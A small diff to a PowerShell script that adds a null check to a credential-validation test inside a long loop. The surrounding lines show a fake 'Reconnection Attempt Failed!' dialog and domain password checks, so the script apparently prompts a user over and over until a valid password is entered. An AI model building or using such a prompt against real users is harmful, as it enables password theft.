@@ -21,7 +21,7 @@ while ( $cnt -lt '1000000000' ) {
         $creds = $DS.ValidateCredentials($c, $credential.GetNetworkCredential().password)
 
 
-	if ($creds -eq $false) {
+	if ($creds -eq $false -Or $creds -eq $null) {
 	    $choice = [System.Windows.Forms.MessageBox]::Show("Authentication failed! Please enter correct password", "Reconnection Attempt Failed!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
 	}		
 
